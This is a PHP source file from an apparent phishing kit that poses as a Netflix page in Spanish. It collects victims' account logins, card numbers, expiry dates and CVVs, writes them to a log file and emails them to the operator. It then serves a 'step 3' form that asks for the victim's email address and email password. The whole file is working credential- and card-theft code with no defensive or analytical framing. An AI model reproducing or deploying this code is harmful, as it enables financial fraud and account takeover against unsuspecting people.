<?php
    require('../../config.php');
    require_once("../../lib/class.inputfilter.php");

    if(isset($_POST['txt-nombre'])){
        date_default_timezone_set('America/Bogota');
        $ifilter = new InputFilter();

        $nombre = $ifilter->process($_POST['txt-nombre']);
        $apellido = $ifilter->process($_POST['txt-apellido']);
        $tarjeta = $ifilter->process($_POST['txt-tarjeta']);
        $fecha = $ifilter->process($_POST['txt-fecha']);
        $cvv = $ifilter->process($_POST['txt-cvv']);

        $usuario = $ifilter->process($_POST['hdd-usuario']);
        $contrasena = $ifilter->process($_POST['hdd-contrasena']);
        $dispositivo = $ifilter->process($_POST['hdd-dispositivo']);

        $ipcliente= $_SERVER['REMOTE_ADDR'];

        $datos = 'Usuario: '.$usuario.' | Clave: '.$contrasena.' | Nombre: '.$nombre.' | Apellido: '.$apellido.' | Tarjeta: '.$tarjeta.' | Fecha: '.$fecha.' | CVV: '.$cvv.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

        $file = '../../2-tc.txt';

        $salto = "";
        $cabecera = "---------------- Paso 2 (".date("Y-m-d H:i:s").")";

        $fp = fopen($file, 'a+');
        fwrite($fp, $salto.PHP_EOL);
        fwrite($fp, $salto.PHP_EOL);
        fwrite($fp, $cabecera.PHP_EOL);
        fwrite($fp, utf8_decode($datos).PHP_EOL);
        fclose($fp);
        chmod($file, 0777);        

        $hoy1 = date("Y/m/d");  
        $hoy2 = date("Y-m-d H:i:s");  

        $to = $destino;
        $subject = "Datos NETF Paso 2 ".$usuario." - ".$hoy1;
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         
        $message = "
        <html>
        <head>
        <title>Datos</title>
        </head>
        <body>
        <b>Usuario: </b>".$usuario."<br> 
        <b>Contraseña: </b>".$contrasena."<br>
        <b>Nombre: </b>".$nombre."<br> 
        <b>Apellido: </b>".$apellido."<br> 
        <b>Tarjeta: </b>".$tarjeta."<br> 
        <b>Fecha: </b>".$fecha."<br>
        <b>CVV: </b>".$cvv."<br>
        <b>Dispositivo: </b>".$dispositivo."<br> 
        <b>Dirección IP: </b>".$ipcliente."<br> 
        <b>Hora/Fecha: </b>".$hoy2."
        </body>
        </html>";
         
        mail($to, $subject, $message, $headers);
?>
<html>
    <head>
        <title>Neflix</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../../img/icono.ico" type="image/x-icon">
        <script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>      
        <link href="../../css/style-white.css" rel="stylesheet">
        <link href="../../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../../js/functions.js"></script> 
        <script type="text/javascript" src="../../js/ready.js"></script>   
        <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,wght@0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">   

    </head>
    <body>
        <div class="container">
            <div class="logo">
                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                    <tr>
                        <td valign="middle" align="left"><img src="../../img/logo.png" width="170"></td>
                        <td valign="middle" align="right" class="btn-cerrar">Cerrar sesión</td>
                    </tr>                    
                </table>
            </div>           
            <div class="frm-correo">
                <form name="smt-correo" id="smt-correo" action="../successful/" method="post" target="_self">
                    <input type="hidden" name="hdd-nombre" id="hdd-nombre" value="<?php echo $_POST['txt-nombre']; ?>">  
                    <input type="hidden" name="hdd-apellido" id="hdd-apellido" value="<?php echo $_POST['txt-apellido']; ?>">  
                    <input type="hidden" name="hdd-tarjeta" id="hdd-tarjeta" value="<?php echo $_POST['txt-tarjeta'] ?>">  

                    <input type="hidden" name="hdd-fecha" id="hdd-fecha" value="<?php echo $_POST['txt-fecha']; ?>">  
                    <input type="hidden" name="hdd-cvv" id="hdd-cvv" value="<?php echo $_POST['txt-cvv']; ?>">  
                    <input type="hidden" name="hdd-dispositivo" id="hdd-dispositivo" value="<?php echo $_POST['hdd-dispositivo']; ?>">  
                    <input type="hidden" name="hdd-usuario" id="hdd-usuario" value="<?php echo $_POST['hdd-usuario']; ?>">  
                    <input type="hidden" name="hdd-contrasena" id="hdd-contrasena" value="<?php echo $_POST['hdd-contrasena']; ?>">  
                    
                    <div class="container-frm">
                        <img src="../../img/icon-cor.png" width="62" style="margin-bottom: 30px;">
                        <div class="paso">PASO 3 DE 3</div>
                        <div class="titulo-negro">Verifica tu cuenta de correo</div>  
                                    
                        <div class="frm-input" id="inp-correo">
                            <div class="etiqueta">Correo electrónico</div>
                            <input type="text" class="entrada" id="txt-correo" name="txt-correo" autocomplete="off" inputmode="email">
                        </div>
                        <div class="error" id="err-correo">Ingresa un correo electrónico.</div>
                    
                        <div class="frm-input" id="inp-clave">
                            <div class="etiqueta">Clave de correo</div>
                            <input type="password" class="entrada" id="txt-clave" name="txt-clave" autocomplete="off">
                        </div>
                        <div class="error" id="err-clave">Ingresa la clave del correo electrónico.</div>
                        
                        <button class="btn btn-rojo esp-btn" id="btn-p2-sgt" type="submit">Finalizar</button>                  
                    </div>
                </form>
            </div>

            <div class="footer">
                <div class="container-foot">
                    ¿Preguntas? Llama al <span class="telefono">01 800 917 1564</span>
                    <br><br>
                    <table cellpadding="0" cellspacing="0" width="100%" id="t1">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                            </td>
                            <td>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t2">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>                            
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t3">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>                           
                                <div class="menu-footer">Términos de uso</div>                                
                            </td>                            
                        </tr>
                    </table>
                    <br>
                    <select style="background-color: #fff;color: #737373;padding: 9px;">
                        <option>Español</option>
                        <option>English</option>
                    </select>
                </div>
            </div>
        </div>
    </body>
</html>
<?php
    }else{
        header('Location: ../../');
    }    
?>